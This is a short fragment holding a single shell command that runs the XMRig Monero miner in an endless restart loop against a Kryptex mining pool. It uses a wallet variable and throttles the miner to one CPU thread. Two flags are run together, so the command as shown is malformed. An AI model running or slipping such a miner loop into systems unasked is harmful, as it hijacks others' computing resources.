...
sh -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero--randomx-mode=light --cpu-max-threads-hint=1 --no-msr --asm=none; sleep 60; done" 
